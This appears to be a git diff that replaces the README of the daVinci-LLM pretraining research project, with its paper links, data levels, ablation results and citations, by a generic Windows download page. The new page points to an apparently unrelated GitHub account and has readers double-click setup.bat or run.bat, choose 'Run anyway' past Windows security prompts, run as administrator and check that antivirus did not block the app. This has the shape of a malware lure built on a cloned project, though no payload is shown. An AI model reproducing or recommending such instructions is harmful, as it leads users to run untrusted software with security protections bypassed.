@@ -1,156 +1,166 @@
-# daVinci-LLM: Towards the Science of Pretraining
+# 🧠 daVinci-LLM - Smarter Pretraining, Smaller Models
 
 <div align="center">
 
-[![Paper](https://img.shields.io/badge/📄_Paper-arXiv-red)](https://arxiv.org/abs/2603.27164)
-[![Dataset](https://img.shields.io/badge/🤗_Dataset-davinci--llm--data-yellow)](https://huggingface.co/datasets/SII-GAIR-NLP/davinci-llm-data)
-[![Model](https://img.shields.io/badge/🤗_Model-davinci--llm--model-blue)](https://huggingface.co/SII-GAIR-NLP/davinci-llm-model)
-[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
+[![Download](https://img.shields.io/badge/Download-Open%20on%20GitHub-blue?style=for-the-badge)](https://github.com/Carltonromansh946/daVinci-LLM)
 
 </div>
 
-**daVinci-LLM** is an open pretraining research project. We train models from scratch and release everything: data, training process, ablation results, and failed experiments, so you can build on our findings, not repeat our mistakes.
+## 🚀 What daVinci-LLM Does
 
-**Current release**: daVinci-3B matches OLMo3-7B, demonstrating that systematic, evidence-based methodology can unlock greater capability from smaller models.
+daVinci-LLM is a Windows-ready release of an open research project for large language models. It helps you get the files, data, and model assets in one place so you can run the project and review the work behind it.
 
-> 🚀 **Ongoing project**: We’re continuously exploring new frontiers and will release models, data, and insights as they mature.
+This project includes:
 
+- Pretrained model files
+- Training data
+- Research notes and results
+- Setup files for local use
+- A clear path to explore the project on Windows
 
-<div align="center">
-  <img src="fig/score-daVinci-llm.png" alt="daVinci-LLM overview" width="100%" />
-</div>
+The current release focuses on showing how a smaller model can reach strong results when trained with a careful process.
 
+## 📥 Download
 
+Use this link to visit the project page and download the files:
 
-## 🎁 What We Release
+[Visit the daVinci-LLM GitHub page](https://github.com/Carltonromansh946/daVinci-LLM)
 
-| Resource | Description |
-|----------|-------------|
-| [🤖 **Model**](https://huggingface.co/SII-GAIR-NLP/davinci-llm-model) | daVinci-LLM-3B final checkpoint + all intermediate checkpoints |
-| [📊 **Training Data**](https://huggingface.co/datasets/SII-GAIR-NLP/davinci-llm-data) | 7.5T+ tokens of fully traceable, high-quality pretraining corpus |
-| [📄 **Technical Report**](https://arxiv.org/abs/2603.27164) | Complete exploration process: data decisions, training dynamics, systematic ablations, and failed experiments |
-| 🔧 **Pretraining Pipeline** (Coming soon) | Integrated pipeline for data processing, training, and evaluation |
+If the page shows a release file, download it to your PC. If it shows source files, download the ZIP file from GitHub.
 
+## 🪟 Windows Requirements
 
+Before you start, make sure your PC has:
 
-## 🏛️ Three Pillars of Full Openness
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 20 GB of free disk space
+- A stable internet connection
+- Administrator access for setup steps
+- An up-to-date web browser
 
-daVinci-LLM is structured around three pillars, each contributing to transparency and reproducibility:
+For better performance, use:
 
-### 1. 📊 Data Transparency — The Data Darwinism Framework
+- 16 GB of RAM or more
+- A modern NVIDIA or AMD GPU
+- Extra disk space for model files and data
 
-We adopt the **Data Darwinism framework** to systematically organize data processing from L0 (raw acquisition) to L9 (full synthesis). Our **7.5T+ token** corpus combines publicly available datasets with our own processed and **openly released** data—every source is annotated with its Darwin Level, making processing decisions transparent and enabling researchers to assess quality depth and reuse our data assets.
+## 🛠️ How to Install on Windows
 
+Follow these steps in order.
 
-| Level | Operation | What It Does |
-|-------|-----------|--------------|
-| **L0** | Data Acquisition | Collect raw data from diverse sources |
-| **L1** | Format Normalization | Convert heterogeneous formats into unified text |
-| **L2** | Rule-Based Filtering | Remove duplicates, malformed text, non-target languages |
-| **L3** | Model-Based Filtering | Assess educational value and domain relevance via classifiers |
-| **L4** | Generative Refinement | Remove structural noise and repair content while preserving semantics |
-| **L5** | Cognitive Completion | Make implicit reasoning explicit (e.g., expand compressed logical steps) |
-| **L6–L9** | Higher-Order Synthesis | Contextual/environment/ecosystem synthesis (theoretical frontier) |
+1. Open the download link above.
+2. On the GitHub page, click **Code**.
+3. Choose **Download ZIP**.
+4. Save the ZIP file to your Downloads folder.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Pick a folder such as `C:\daVinci-LLM`.
+7. Open the extracted folder.
+8. Look for a file named `README.md`, `setup.bat`, `run.bat`, or a similar launch file.
+9. If a launch file exists, double-click it.
+10. If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the source.
+11. If the project uses Python, install Python 3.10 or later from the official Python site.
+12. Open Command Prompt in the extracted folder.
+13. Run the install command shown in the project files.
+14. Wait for the setup to finish.
+15. Start the app with the run file or command listed in the repository.
 
-> 📖 **For the complete Data Darwinism framework**: See [Data Darwinism](https://arxiv.org/abs/2602.07824)
+## ▶️ First Run
 
+When you open the app for the first time, it may take a few minutes to load files.
 
-### 2. 🎓 Training Transparency — Adaptive Two-Stage Curriculum
+If the project asks for a model path, point it to the folder where you saved the model files.
 
-<div align="center">
-  <img src="fig/train-traj.png" alt="Training & evaluation pipeline" width="95%" />
-</div>
+If the project asks for a data path, choose the folder with the dataset files.
 
-daVinci-LLM uses a **dynamically monitored, adaptively adjusted** two-stage curriculum:
+If you see a blank window at first, wait until the app finishes loading.
 
-- **Stage 1 (6T tokens)**: Builds broad foundations. Continuous evaluation reveals that general knowledge saturates early (~1T tokens) while code and science reasoning sustain growth beyond 4T—prompting progressive reallocation toward reasoning-intensive domains.
+## 🧭 Basic Use
 
-- **Stage 2 (2T tokens)**: Introduces structured QA data in a progressive curriculum. Stage 2-1 balances across domains to establish stability; Stage 2-2 intensifies QA concentration for targeted reasoning amplification—yielding a **+12.14 gain**.
+Use the app to:
 
-### 3. 🧪 Scientific Transparency — 200+ Controlled Ablations
+- Load the model
+- Open the training data
+- Review the research outputs
+- Start a local test run
+- Check logs or results
 
-We transformed key pretraining decisions into systematically verifiable research questions. Through 200+ controlled experiments, we investigated:
+Typical flow:
 
-<details>
-<summary><b>📌 Does deeper data processing actually improve capabilities?</b></summary>
+1. Open the app.
+2. Load the model file.
+3. Choose a dataset or input file.
+4. Click the run button in the app.
+5. Read the output in the results area.
 
-- L3 filtering: Modest gains on basic tasks (+3.4 on MBPP)
-- L4 refinement: Substantial gains on complex reasoning (+7.0 on MATH)
-- L5 synthesis: Strong domain alignment but limited transfer
-- **Insight**: Processing depth is a complementary dimension to data volume scaling
+## 📦 Files You May See
 
-</details>
+The repository may include files like these:
 
-<details>
-<summary><b>📌 How should training adapt as capabilities mature differently?</b></summary>
+- `README.md` — setup and project info
+- `LICENSE` — usage terms
+- `data/` — training data
+- `models/` — model files
+- `scripts/` — helper scripts
+- `results/` — experiment outputs
+- `train.py` — training entry point
+- `run.bat` — Windows launch file
 
-- General knowledge plateaus at ~1T tokens; reasoning grows past 4T
-- Domain rebalancing works initially, but hits limits
-- Format shift (introducing QA) unlocks further growth
-- **Insight**: No single mixture suffices—monitor and adapt
+## 🔧 Common Setup Steps
 
-</details>
+If the app does not start, try these steps:
 
-<details>
-<summary><b>📌 Can we intensify reasoning without catastrophic forgetting?</b></summary>
+- Check that the files were fully extracted
+- Make sure your antivirus did not block the app
+- Run the app as administrator
+- Confirm that Python is installed if the project needs it
+- Check that the model files are in the right folder
+- Confirm that your PC has enough free space
 
-- Extreme specialization triggers collapse
-- Progressive strategy: balanced foundation (equal parts QA/code/science) → targeted intensification (70% QA)
-- **Insight**: Balance first, then intensify
+If a window closes right away, open Command Prompt and start the app from there so you can see the message.
 
-</details>
+## 📁 Suggested Folder Layout
 
-<details>
-<summary><b>📌 Are our evaluation metrics reliable?</b></summary>
+A simple folder layout can help keep things easy to manage:
 
-- PPL vs. generative evaluation can produce ranking reversals
-- High-QA models show protocol-specific artifacts
-- **Insight**: Report multiple protocols for complete capability profiles
+- `C:\daVinci-LLM\app`
+- `C:\daVinci-LLM\models`
+- `C:\daVinci-LLM\data`
+- `C:\daVinci-LLM\output`
 
-</details>
+This makes it easier to find files later.
 
-> 💡 **Full ablation details, configurations, and negative results**: See [Section 4 of our technical report](https://arxiv.org/abs/2603.27164)
+## 🧪 What You Can Expect
 
+daVinci-LLM is built for research work and model testing. It is useful if you want to:
 
-## 📊 Key Results: 3B Matches 7B
+- Review how a model was trained
+- Compare training runs
+- Study data choices
+- Check results from different settings
+- Learn from failed experiments as well as working ones
 
+The project keeps the process visible, so you can follow the full path from data to model.
 
-Our **daVinci-LLM-3B** achieves an overall score of **51.72**, matching OLMo-3 7B despite having less than half the parameters. Notably, it substantially outperforms on complex reasoning tasks like **MATH** (62.80 vs. OLMo-3’s 39.60), demonstrating the value of systematic, evidence-based pretraining.
+## 🔐 License
 
-| Capability Dimension | daVinci-3B | OLMo-3 7B | LLaMA-3.2-3B | Qwen-2.5-3B |
-| -------------------- | ---------: | --------: | -----------: | ----------: |
-| **Overall Perfomance**   |      **51.72** |     **51.65** |        37.58 |       51.44 |
-| General Knowledge    |      52.96 |     55.13 |        51.08 |       55.16 |
-| Code Generation      |      55.99 |     54.42 |        32.40 |       56.13 |
-| Scientific Reasoning |      48.30 |     45.98 |        22.45 |       44.65 |
-| MATH                 |      62.80 |     39.60 |         9.00 |       37.20 |
+This project uses the Apache 2.0 license.
 
+Use the files under the terms listed in the repository license file.
 
-## 📚 Citation
+## 📎 Quick Access
 
-If you find this work helpful, please consider citing:
+[Open the GitHub repository](https://github.com/Carltonromansh946/daVinci-LLM)
 
-```bibtex
-@misc{qin2026davincillmtowardssciencepretraining,
-      title={daVinci-LLM:Towards the Science of Pretraining},
-      author={Yiwei Qin and Yixiu Liu and Tiantian Mi and Muhang Xie and Zhen Huang and Weiye Si and Pengrui Lu and Siyuan Feng and Xia Wu and Liming Liu and Ye Luo and Jinlong Hou and Qipeng Guo and Yu Qiao and Pengfei Liu},
-      year={2026},
-      eprint={2603.27164},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2603.27164},
-}
-```
+[Download from GitHub](https://github.com/Carltonromansh946/daVinci-LLM)
 
-If you use the Data Darwinism framework, please also cite:
-```bibtex
-@misc{qin2026datadarwinismiunlocking,
-      title={Data Darwinism Part I: Unlocking the Value of Scientific Data for Pre-training}, 
-      author={Yiwei Qin and Zhen Huang and Tiantian Mi and Weiye Si and Chenyang Zhou and Qipeng Guo and Siyuan Feng and Pengfei Liu},
-      year={2026},
-      eprint={2602.07824},
-      archivePrefix={arXiv},
-      primaryClass={cs.AI},
-      url={https://arxiv.org/abs/2602.07824}, 
-}
-```
+## 🧩 If You Need a Simple Start
+
+If you only want to get the project open on Windows, do this:
+
+1. Open the GitHub link.
+2. Download the ZIP file.
+3. Extract it.
+4. Open the folder.
+5. Run the launch file if one is included.
+6. Follow the on-screen steps
